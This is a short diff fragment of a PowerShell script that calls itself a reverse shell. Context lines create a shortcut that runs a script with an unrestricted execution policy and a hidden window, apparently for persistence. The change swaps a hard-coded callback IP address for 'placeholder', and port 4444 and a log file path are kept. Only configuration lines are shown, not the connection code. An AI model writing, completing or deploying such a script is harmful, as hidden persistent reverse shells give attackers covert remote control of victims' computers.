@@ -31,7 +31,7 @@ $shortcut.Arguments = "-ExecutionPolicy Unrestricted -WindowStyle Hidden -File `
 $shortcut.Save()
 
 # Initialize the reverse shell
-$hostIP = "192.168.0.13"
+$hostIP = "placeholder"
 $port = 4444
 
 $logFile = "C:\reverse_shell_log.txt"
